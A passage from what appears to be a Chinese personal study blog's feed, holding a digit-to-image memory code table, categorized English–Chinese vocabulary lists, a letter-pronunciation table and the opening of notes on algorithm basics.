src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/32扇儿.png"></td></tr><tr><td align="center">33</td><td align="center">谐音</td><td align="center">闪闪的星星</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/33星星.png"></td></tr><tr><td align="center">34</td><td align="center">谐音</td><td align="center">三条丝巾</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/34三丝.png"></td></tr><tr><td align="center">35</td><td align="center">谐音</td><td align="center">山虎</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/35山虎.png"></td></tr><tr><td align="center">36</td><td align="center">谐音</td><td align="center">山鹿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/36山鹿.png"></td></tr><tr><td align="center">37</td><td align="center">谐音</td><td align="center">山鸡</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/37山鸡.png"></td></tr><tr><td align="center">38</td><td align="center">节日：妇女节</td><td align="center">妇女</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/38妇女.png"></td></tr><tr><td align="center">39</td><td align="center">谐音</td><td align="center">三九胃泰</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/39三九胃泰.png"></td></tr><tr><td align="center">40</td><td align="center">谐音</td><td align="center">司令</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/40司令.png"></td></tr><tr><td align="center">41</td><td align="center">谐音</td><td align="center">蜥蜴</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/41蜥蜴.png"></td></tr><tr><td align="center">42</td><td align="center">谐音</td><td align="center">柿儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/42柿儿.png"></td></tr><tr><td align="center">43</td><td align="center">谐音</td><td align="center">死神</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/43死神.png"></td></tr><tr><td align="center">44</td><td align="center">蛇“嘶嘶”的声音</td><td align="center">蛇</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/44蛇.png"></td></tr><tr><td align="center">45</td><td align="center">谐音</td><td align="center">师傅</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/45师父.png"></td></tr><tr><td align="center">46</td><td align="center">谐音</td><td align="center">饲料</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/46饲料.png"></td></tr><tr><td align="center">47</td><td align="center">谐音</td><td align="center">司机</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/47司机.png"></td></tr><tr><td align="center">48</td><td align="center">谐音</td><td align="center">石板</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/48石板.png"></td></tr><tr><td align="center">49</td><td align="center">谐音</td><td align="center">湿狗</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/49湿狗.png"></td></tr><tr><td align="center">50</td><td align="center">谐音</td><td align="center">武林</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/50武林.png"></td></tr><tr><td align="center">51</td><td align="center">节日：劳动节</td><td align="center">工人</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/51工人.png"></td></tr><tr><td align="center">52</td><td align="center">谐音</td><td align="center">鼓儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/52鼓儿.png"></td></tr><tr><td align="center">53</td><td align="center">谐音</td><td align="center">乌纱帽</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/53乌纱帽.png"></td></tr><tr><td align="center">54</td><td align="center">节日：青年节</td><td align="center">青年</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/54青年.png"></td></tr><tr><td align="center">55</td><td align="center">谐音：火车“呜呜”的声音</td><td align="center">火车</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/55火车.png"></td></tr><tr><td align="center">56</td><td align="center">谐音</td><td align="center">蜗牛</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/56蜗牛.png"></td></tr><tr><td align="center">57</td><td align="center">谐音</td><td align="center">武器</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/57武器.png"></td></tr><tr><td align="center">58</td><td align="center">谐音</td><td align="center">尾巴</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/58尾巴.png"></td></tr><tr><td align="center">59</td><td align="center">谐音</td><td align="center">蜈蚣</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/59蜈蚣.png"></td></tr><tr><td align="center">60</td><td align="center">谐音</td><td align="center">榴莲</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/60榴莲.png"></td></tr><tr><td align="center">61</td><td align="center">节日：儿童节</td><td align="center">儿童</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/61儿童.png"></td></tr><tr><td align="center">62</td><td align="center">谐音</td><td align="center">牛儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/62牛儿.png"></td></tr><tr><td align="center">63</td><td align="center">谐音</td><td align="center">流沙</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/63流沙.png"></td></tr><tr><td align="center">64</td><td align="center">谐音</td><td align="center">螺丝</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/64螺丝.png"></td></tr><tr><td align="center">65</td><td align="center">谐音</td><td align="center">尿壶</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/65尿壶.png"></td></tr><tr><td align="center">66</td><td align="center">谐音</td><td align="center">溜溜球</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/66溜溜球.png"></td></tr><tr><td align="center">67</td><td align="center">谐音</td><td align="center">油漆</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/67油漆.png"></td></tr><tr><td align="center">68</td><td align="center">谐音</td><td align="center">喇叭</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/68喇叭.png"></td></tr><tr><td align="center">69</td><td align="center">谐音</td><td align="center">料酒</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/69料酒.png"></td></tr><tr><td align="center">70</td><td align="center">谐音</td><td align="center">冰淇凌</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/70冰淇淋.png"></td></tr><tr><td align="center">71</td><td align="center">谐音</td><td align="center">鸡翼</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/71鸡翅.png"></td></tr><tr><td align="center">72</td><td align="center">谐音</td><td align="center">企鹅</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/72企鹅.png"></td></tr><tr><td align="center">73</td><td align="center">谐音</td><td align="center">花旗参</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/73花旗参.png"></td></tr><tr><td align="center">74</td><td align="center">谐音</td><td align="center">骑士</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/74骑士.png"></td></tr><tr><td align="center">75</td><td align="center">谐音</td><td align="center">西服</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/75西服.png"></td></tr><tr><td align="center">76</td><td align="center">谐音</td><td align="center">汽油</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/76汽油.png"></td></tr><tr><td align="center">77</td><td align="center">谐音</td><td align="center">机器人</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/77机器人.png"></td></tr><tr><td align="center">78</td><td align="center">谐音</td><td align="center">青蛙</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/78青蛙.png"></td></tr><tr><td align="center">79</td><td align="center">谐音</td><td align="center">气球</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/79气球.png"></td></tr><tr><td align="center">80</td><td align="center">谐音</td><td align="center">巴黎铁塔</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/80巴黎铁塔.png"></td></tr><tr><td align="center">81</td><td align="center">谐音</td><td align="center">白蚁</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/81白蚁.png"></td></tr><tr><td align="center">82</td><td align="center">谐音</td><td align="center">靶儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/82靶儿.png"></td></tr><tr><td align="center">83</td><td align="center">谐音</td><td align="center">芭蕉扇</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/83芭蕉扇.png"></td></tr><tr><td align="center">84</td><td align="center">谐音</td><td align="center">巴士</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/84巴士.png"></td></tr><tr><td align="center">85</td><td align="center">谐音</td><td align="center">宝物</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/85宝物.png"></td></tr><tr><td align="center">86</td><td align="center">谐音</td><td align="center">八路军</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/86八路.png"></td></tr><tr><td align="center">87</td><td align="center">谐音</td><td align="center">白棋</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/87白棋.png"></td></tr><tr><td align="center">88</td><td align="center">谐音</td><td align="center">爸爸</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/88爸爸.png"></td></tr><tr><td align="center">89</td><td align="center">谐音</td><td align="center">芭蕉</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/89芭蕉.png"></td></tr><tr><td align="center">90</td><td align="center">谐音</td><td align="center">精灵</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/90精灵.png"></td></tr><tr><td align="center">91</td><td align="center">谐音</td><td align="center">球衣</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/91球衣.png"></td></tr><tr><td align="center">92</td><td align="center">谐音</td><td align="center">球儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/92球儿.png"></td></tr><tr><td align="center">93</td><td align="center">谐音</td><td align="center">旧伞</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/93旧伞.png"></td></tr><tr><td align="center">94</td><td align="center">谐音</td><td align="center">教师</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/94教师.png"></td></tr><tr><td align="center">95</td><td align="center">谐音</td><td align="center">酒壶</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/95酒壶.png"></td></tr><tr><td align="center">96</td><td align="center">谐音</td><td align="center">酒楼</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/96酒楼.png"></td></tr><tr><td align="center">97</td><td align="center">谐音</td><td align="center">旧旗</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/97旧旗.png"></td></tr><tr><td align="center">98</td><td align="center">谐音</td><td align="center">酒吧</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/98酒吧.png"></td></tr><tr><td align="center">99</td><td align="center">谐音</td><td align="center">舅舅</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/99舅舅.png"></td></tr><tr><td align="center">0</td><td align="center">形状</td><td align="center">呼啦圈</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/0呼啦圈.png"></td></tr><tr><td align="center">1</td><td align="center">形状</td><td align="center">蜡烛</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/1蜡烛.png"></td></tr><tr><td align="center">2</td><td align="center">形状</td><td align="center">鹅</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/2鹅.png"></td></tr><tr><td align="center">3</td><td align="center">形状</td><td align="center">耳朵</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/3耳朵.png"></td></tr><tr><td align="center">4</td><td align="center">形状</td><td align="center">帆船</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/4帆船.png"></td></tr><tr><td align="center">5</td><td align="center">形状</td><td align="center">秤钩</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/5称钩.png"></td></tr><tr><td align="center">6</td><td align="center">形状</td><td align="center">勺子</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/6勺子.png"></td></tr><tr><td align="center">7</td><td align="center">形状</td><td align="center">镰刀</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/7镰刀.png"></td></tr><tr><td align="center">8</td><td align="center">形状</td><td align="center">眼镜</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/8眼镜.png"></td></tr><tr><td align="center">9</td><td align="center">形状</td><td align="center">口哨</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/9哨子.png"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 知识宫殿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编码系统 </tag>
            
            <tag> 数字编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>英语词汇分类汇总</title>
      <link href="/2020/09/02/ying-yu-ci-hui-fen-lei-hui-zong/"/>
      <url>/2020/09/02/ying-yu-ci-hui-fen-lei-hui-zong/</url>
      
        <content type="html"><![CDATA[<center><font size="100">英语词汇分类汇总</font></center><h1 id="专业课程"><a href="#专业课程" class="headerlink" title="专业课程"></a>专业课程</h1><table><thead><tr><th align="center">英文</th><th align="center">汉语</th></tr></thead><tbody><tr><td align="center">Arts</td><td align="center">文科</td></tr><tr><td align="center">Science</td><td align="center">理科</td></tr><tr><td align="center">Agriculture</td><td align="center">农业学</td></tr><tr><td align="center">Architecture</td><td align="center">建筑学</td></tr><tr><td align="center">Chemistry</td><td align="center">化学</td></tr><tr><td align="center">Astronomy</td><td align="center">天文学</td></tr><tr><td align="center">Biology</td><td align="center">生物学</td></tr><tr><td align="center">Economics</td><td align="center">经济学</td></tr><tr><td align="center">Engineering</td><td align="center">工程学</td></tr><tr><td align="center">Finance</td><td align="center">金融学</td></tr><tr><td align="center">Geography</td><td align="center">地理学</td></tr><tr><td align="center">Geology</td><td align="center">地质学</td></tr><tr><td align="center">Literature</td><td align="center">文学</td></tr><tr><td align="center">Medicine</td><td align="center">医学</td></tr><tr><td align="center">Mining</td><td align="center">采矿学</td></tr><tr><td align="center">Philosophy</td><td align="center">哲学</td></tr><tr><td align="center">Physics</td><td align="center">物理学</td></tr><tr><td align="center">Politics</td><td align="center">物理学</td></tr><tr><td align="center">Politics</td><td align="center">政治学</td></tr><tr><td align="center">Psychology</td><td align="center">心理学</td></tr><tr><td align="center">Sociology</td><td align="center">社会学</td></tr><tr><td align="center">Mechanics</td><td align="center">机械学</td></tr><tr><td align="center">Public Relations</td><td align="center">公共关系学</td></tr><tr><td align="center">major</td><td align="center">主修（课）</td></tr><tr><td align="center">minor</td><td align="center">辅修（课）</td></tr><tr><td align="center">specialized course</td><td align="center">专业课</td></tr><tr><td align="center">selective/optional course</td><td align="center">选修课</td></tr><tr><td align="center">required course</td><td align="center">必修课</td></tr><tr><td align="center">curriculum</td><td align="center">课程</td></tr></tbody></table><h1 id="性格态度"><a href="#性格态度" class="headerlink" title="性格态度"></a>性格态度</h1><table><thead><tr><th align="center">英文</th><th align="center">汉语</th></tr></thead><tbody><tr><td align="center">active</td><td align="center">活跃的</td></tr><tr><td align="center">extrovert</td><td align="center">外向的</td></tr><tr><td align="center">energetic</td><td align="center">精力充沛的</td></tr><tr><td align="center">introvert</td><td align="center">内向的</td></tr><tr><td align="center">humorous</td><td align="center">幽默的</td></tr><tr><td align="center">amiable</td><td align="center">和蔼可亲的</td></tr><tr><td align="center">agreeable</td><td align="center">令人愉快的</td></tr><tr><td align="center">impulsive</td><td align="center">冲动的</td></tr><tr><td align="center">strict</td><td align="center">一丝不苟的</td></tr><tr><td align="center">frank</td><td align="center">坦率的</td></tr><tr><td align="center">careful</td><td align="center">办事仔细的</td></tr><tr><td align="center">demanding</td><td align="center">要求严格的</td></tr><tr><td align="center">honest</td><td align="center">诚实的</td></tr><tr><td align="center">decisive</td><td align="center">果断的</td></tr><tr><td align="center">capable</td><td align="center">有能力的</td></tr><tr><td align="center">upright</td><td align="center">正直的</td></tr><tr><td align="center">sociable</td><td align="center">好交际的</td></tr><tr><td align="center">reliable</td><td align="center">可靠的</td></tr><tr><td align="center">generous</td><td align="center">宽容的</td></tr><tr><td align="center">serious</td><td align="center">严肃的</td></tr><tr><td align="center">intelligent</td><td align="center">聪明的</td></tr><tr><td align="center">independent</td><td align="center">独立的</td></tr><tr><td align="center">relaxed</td><td align="center">放松的</td></tr><tr><td align="center">efficient</td><td align="center">有效率的</td></tr><tr><td align="center">faithful</td><td align="center">忠诚的</td></tr><tr><td align="center">steady</td><td align="center">稳健的</td></tr><tr><td align="center">competent</td><td align="center">能干的</td></tr><tr><td align="center">responsible</td><td align="center">有责任心的</td></tr><tr><td align="center">industrious</td><td align="center">勤奋的</td></tr><tr><td align="center">adaptable</td><td align="center">适应性强的</td></tr><tr><td align="center">calm</td><td align="center">冷静的</td></tr><tr><td align="center">accurate</td><td align="center">精确的</td></tr><tr><td align="center">analytical</td><td align="center">头脑缜密的</td></tr><tr><td align="center">genteel</td><td align="center">有教养的</td></tr><tr><td align="center">devoted</td><td align="center">专心致志的</td></tr><tr><td align="center">creative</td><td align="center">富有创造力的</td></tr><tr><td align="center">courteous</td><td align="center">有礼貌的</td></tr><tr><td align="center">dedicated</td><td align="center">专注的</td></tr></tbody></table><h1 id="业余爱好"><a href="#业余爱好" class="headerlink" title="业余爱好"></a>业余爱好</h1><table><thead><tr><th align="center">英文</th><th align="center">汉语</th></tr></thead><tbody><tr><td align="center">ball game</td><td align="center">球类运动</td></tr><tr><td align="center">tennis</td><td align="center">网球</td></tr><tr><td align="center">basketball</td><td align="center">篮球</td></tr><tr><td align="center">volleyball</td><td align="center">排球</td></tr><tr><td align="center">baseball</td><td align="center">棒球</td></tr><tr><td align="center">table-tennis</td><td align="center">乒乓球</td></tr><tr><td align="center">badminton</td><td align="center">羽毛球</td></tr><tr><td align="center">football</td><td align="center">足球</td></tr><tr><td align="center">swimming</td><td align="center">游泳</td></tr><tr><td align="center">climbing</td><td align="center">登山</td></tr><tr><td align="center">hiking</td><td align="center">远足</td></tr><tr><td align="center">camping</td><td align="center">野营</td></tr><tr><td align="center">music</td><td align="center">音乐</td></tr><tr><td align="center">novel</td><td align="center">小说</td></tr><tr><td align="center">guitar</td><td align="center">吉他</td></tr><tr><td align="center">piano</td><td align="center">钢琴</td></tr><tr><td align="center">chess</td><td align="center">象棋</td></tr><tr><td align="center">sketching</td><td align="center">素描</td></tr><tr><td align="center">calligraphy</td><td align="center">书法</td></tr><tr><td align="center">traveling</td><td align="center">旅游</td></tr><tr><td align="center">singing</td><td align="center">唱歌</td></tr><tr><td align="center">body-building</td><td align="center">健身</td></tr><tr><td align="center">stamp/coin collection</td><td align="center">集邮/收集硬币</td></tr></tbody></table><h1 id="经典书籍"><a href="#经典书籍" class="headerlink" title="经典书籍"></a>经典书籍</h1><table><thead><tr><th align="center">英文</th><th align="center">汉语</th></tr></thead><tbody><tr><td align="center"><em>The Spring and Autumn Annals</em></td><td align="center">《春秋》</td></tr><tr><td align="center"><em>Historical Records</em></td><td align="center">《史记》</td></tr><tr><td align="center"><em>The Book of Songs</em></td><td align="center">《诗经》</td></tr><tr><td align="center"><em>The Book of History</em></td><td align="center">《书经》</td></tr><tr><td align="center"><em>The Book of Changes</em></td><td align="center">《易经》</td></tr><tr><td align="center"><em>The Four Books</em></td><td align="center">四书</td></tr><tr><td align="center"><em>The Five Classics</em></td><td align="center">五经</td></tr><tr><td align="center"><em>The Book of Rites</em></td><td align="center">《礼记》</td></tr><tr><td align="center"><em>The Great Learning</em></td><td align="center">《大学》</td></tr><tr><td align="center"><em>The Doctrine of the Mean</em></td><td align="center">《中庸》</td></tr><tr><td align="center"><em>The Analects of Confucius</em></td><td align="center">《论语》</td></tr><tr><td align="center"><em>The Mencius</em></td><td align="center">《孟子》</td></tr><tr><td align="center"><em>The Classic of Mountains and Rivers</em></td><td align="center">《山海经》</td></tr><tr><td align="center"><em>Compendium of Materia Medica</em></td><td align="center">《本草纲目》</td></tr><tr><td align="center"><em>History as a Mirror</em></td><td align="center">《资治通鉴》</td></tr><tr><td align="center"><em>The Romance of West Chamber</em></td><td align="center">《西厢记》</td></tr><tr><td align="center"><em>Red Star Over China</em></td><td align="center">《西行漫记》</td></tr><tr><td align="center"><em>The Romance of the Three Kingdoms</em></td><td align="center">《三国演义》</td></tr><tr><td align="center"><em>Water Margin</em></td><td align="center">《水浒传》</td></tr><tr><td align="center"><em>Journey to the West;Pilgrimage to the West</em></td><td align="center">《西游记》</td></tr><tr><td align="center"><em>A Dream in Red Mansions;The Story of the Stone</em></td><td align="center">《红楼梦》</td></tr><tr><td align="center"><em>Strange Tales of a Lonely Studio</em></td><td align="center">《聊斋志异》</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语单词 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>26个字母音标表</title>
      <link href="/2020/09/02/26-ge-zi-mu-yin-biao-biao/"/>
      <url>/2020/09/02/26-ge-zi-mu-yin-biao-biao/</url>
      
        <content type="html"><![CDATA[<p>26个字母音标表</p><table><thead><tr><th align="center">大写</th><th align="center">小写</th><th align="center">音标</th></tr></thead><tbody><tr><td align="center"><code>A</code></td><td align="center"><code>a</code></td><td align="center"><code>[ei]</code></td></tr><tr><td align="center"><code>B</code></td><td align="center"><code>b</code></td><td align="center"><code>[bi:]</code></td></tr><tr><td align="center"><code>C</code></td><td align="center"><code>c</code></td><td align="center"><code>[si:]</code></td></tr><tr><td align="center"><code>D</code></td><td align="center"><code>d</code></td><td align="center"><code>[di:]</code></td></tr><tr><td align="center"><code>E</code></td><td align="center"><code>e</code></td><td align="center"><code>[i:]</code></td></tr><tr><td align="center"><code>F</code></td><td align="center"><code>f</code></td><td align="center"><code>[ef]</code></td></tr><tr><td align="center"><code>G</code></td><td align="center"><code>g</code></td><td align="center"><code>[dʒi:]</code></td></tr><tr><td align="center"><code>H</code></td><td align="center"><code>h</code></td><td align="center"><code>[eit∫]</code></td></tr><tr><td align="center"><code>I</code></td><td align="center"><code>i</code></td><td align="center"><code>[ai]</code></td></tr><tr><td align="center"><code>J</code></td><td align="center"><code>j</code></td><td align="center"><code>[dʒei]</code></td></tr><tr><td align="center"><code>K</code></td><td align="center"><code>k</code></td><td align="center"><code>[kei]</code></td></tr><tr><td align="center"><code>L</code></td><td align="center"><code>l</code></td><td align="center"><code>[el]</code></td></tr><tr><td align="center"><code>M</code></td><td align="center"><code>m</code></td><td align="center"><code>[em]</code></td></tr><tr><td align="center"><code>N</code></td><td align="center"><code>n</code></td><td align="center"><code>[en]</code></td></tr><tr><td align="center"><code>O</code></td><td align="center"><code>o</code></td><td align="center"><code>[əu]</code></td></tr><tr><td align="center"><code>P</code></td><td align="center"><code>p</code></td><td align="center"><code>[pi:]</code></td></tr><tr><td align="center"><code>Q</code></td><td align="center"><code>q</code></td><td align="center"><code>[kju:]</code></td></tr><tr><td align="center"><code>R</code></td><td align="center"><code>r</code></td><td align="center"><code>[ɑ:]</code></td></tr><tr><td align="center"><code>S</code></td><td align="center"><code>s</code></td><td align="center"><code>[es]</code></td></tr><tr><td align="center"><code>T</code></td><td align="center"><code>t</code></td><td align="center"><code>[ti:]</code></td></tr><tr><td align="center"><code>U</code></td><td align="center"><code>u</code></td><td align="center"><code>[ju:]</code></td></tr><tr><td align="center"><code>V</code></td><td align="center"><code>v</code></td><td align="center"><code>[vi:]</code></td></tr><tr><td align="center"><code>W</code></td><td align="center"><code>w</code></td><td align="center"><code>[′d∧blju:]</code></td></tr><tr><td align="center"><code>X</code></td><td align="center"><code>x</code></td><td align="center"><code>[eks]</code></td></tr><tr><td align="center"><code>Y</code></td><td align="center"><code>y</code></td><td align="center"><code>[wai]</code></td></tr><tr><td align="center"><code>Z</code></td><td align="center"><code>z</code></td><td align="center"><code>[zi:]</code>,<code>[zed]</code></td></tr></tbody></table><p><a href="https://en-yinbiao.xiao84.com/yinbiaofayin/" target="_blank" rel="noopener">巴士英语网-48个国际音标</a></p><p><a href="http://www.gaosan.com/gaokao/244383.html" target="_blank" rel="noopener">高三网-48个英语音标正确读法</a></p><p><a href="http://yinbiao.tingclass.net/show-16-9-1.html#" target="_blank" rel="noopener">英语音标</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识宫殿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 速记基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法基础</title>
      <link href="/2020/09/02/suan-fa-ji-chu/"/>
      <url>/2020/09/02/suan-fa-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="算法定义"><a href="#算法定义" class="headerlink" title="算法定义"></a>算法定义</h1><p>​        算法是对特定问题求解步骤的一种描述，它不依赖于任何语言，既可以使用自然语言、程序语言等描述，也可以使用流程图、框图来表示。（个人可以根据自己的喜好来选择算法的描述方式，最常用的是一种类C伪代码）</p><h1 id="算法评价"><a href="#算法评价" class="headerlink" title="算法评价"></a>算法评价</h1><ul><li><strong>数学</strong>是皇冠上的<strong>明珠</strong>，<strong>算法</strong>是明珠上的<strong>光芒</strong>。(数学是美学，算法是艺术）</li><li><strong>数据结构</strong>是程序的<strong>骨架</strong>，<strong>算法</strong>是程序的<strong>灵魂</strong>。（数据结构+算法＝程序）</li></ul><h1 id="算法特性"><a href="#算法特性" class="headerlink" title="算法特性"></a>算法特性</h1><ul><li><strong>输入</strong>：有零个或多个输入<strong>（≥0）</strong></li><li><strong>输出</strong>：有一个或多个输出<strong>（≥1）</strong></li><li><strong>有穷性</strong>：算法是由若干条指令组成的<strong>有穷序列</strong>，总是在执行若干次后结束，不能永不停止</li><li><strong>确定性</strong>：每条语句有确定的意义，<strong>无歧义</strong></li><li><strong>可行性</strong>：算法在当前环境条件下可以通过有限次运算实现</li></ul><h1 id="算法评判标准"><a href="#算法评判标准" class="headerlink" title="算法评判标准"></a>算法评判标准</h1><ul><li><strong>正确性</strong>：正确性是指算法能够满足具体问题的需求，程序运行正常，无语法错误，能够通过典型软件测试，达到预期的需求。</li><li><strong>易读性</strong>：算法遵循标识符命名规则，简洁易懂，注释语句恰当适量，方便自己和他人阅读，便于后期调试和修改。</li><li><strong>健壮性</strong>：算法对非法数据及操作有较好的反应和处理。</li><li><strong>高效性</strong>：高效性是指算法运行效率高，即算法运行消耗的时间短。（时间复杂度）</li><li><strong>低存储性</strong>：低存储性是指算法所需的存储空间低。（空间复杂度）</li></ul><h1 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h1><p>​        